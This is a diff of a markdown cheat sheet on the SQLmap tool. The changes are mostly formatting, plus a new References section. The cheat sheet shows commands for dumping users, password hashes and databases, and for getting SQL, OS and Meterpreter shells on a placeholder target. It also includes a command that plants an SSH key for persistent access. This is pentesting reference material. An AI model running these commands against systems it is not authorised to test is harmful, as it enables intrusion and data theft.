@@ -1,12 +1,13 @@
 # SQLmap
 
-SQLmap is a powerful tool that automates the detection and exploitation of SQL injection vulnerabilities, saving time and effort compared to manual testing. It supports a wide range of databases and injection techniques, making it versatile and effective in various scenarios. 
+> SQLmap is a powerful tool that automates the detection and exploitation of SQL injection vulnerabilities, saving time and effort compared to manual testing. It supports a wide range of databases and injection techniques, making it versatile and effective in various scenarios. 
 
-Additionally, SQLmap can retrieve data, manipulate databases, and even execute commands, providing a robust set of features for penetration testers and security analysts.
+> Additionally, SQLmap can retrieve data, manipulate databases, and even execute commands, providing a robust set of features for penetration testers and security analysts.
 
-Reinventing the wheel isn't ideal because SQLmap has been rigorously developed, tested, and improved by experts. Using a reliable, community-supported tool means you benefit from established best practices and avoid the high risk of missing vulnerabilities or introducing errors in custom code.
+> Reinventing the wheel isn't ideal because SQLmap has been rigorously developed, tested, and improved by experts. Using a reliable, community-supported tool means you benefit from established best practices and avoid the high risk of missing vulnerabilities or introducing errors in custom code.
 
-However you should always know how SQLmap is working, and be able to replicate it manually if necessary.
+>However you should always know how SQLmap is working, and be able to replicate it manually if necessary.
+
 
 ## Summary
 
@@ -22,6 +23,7 @@ However you should always know how SQLmap is working, and be able to replicate i
     * [Tamper Scripts](#tamper-scripts)
 * [Reduce Requests Number](#reduce-requests-number)
 * [SQLmap Without SQL Injection](#sqlmap-without-sql-injection)
+* [References](#references)
 
 
 ## Basic Arguments For SQLmap
@@ -29,6 +31,7 @@ However you should always know how SQLmap is working, and be able to replicate i
 ```powershell
 sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
 ```
+
 
 ## Load A Request File
 
@@ -62,10 +65,25 @@ sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrat
 
 ## Getting A Shell
 
-* SQL Shell: `python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell`
-* OS Shell: `python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell`
-* Meterpreter: `python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn`
-* SSH Shell: `python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/`
+* SQL Shell: 
+    ```ps1
+    python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell
+    ```
+
+* OS Shell: 
+    ```ps1
+    python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell
+    ```
+    
+* Meterpreter: 
+    ```ps1
+    python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn
+    ```
+
+* SSH Shell: 
+    ```ps1
+    python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
+    ```
 
 
 ## Crawl And Auto-Exploit
@@ -223,3 +241,9 @@ You can use SQLmap to access a database via its port instead of a URL.
 ```ps1
 sqlmap.py -d "mysql://user:pass@ip/database" --dump-all
 ```
+
+
+## References
+
+- [#SQLmap protip - @zh4ck - March 10, 2018](https://twitter.com/zh4ck/status/972441560875970560)
+- [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper - Mehmet Ince - August 1, 2017](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)
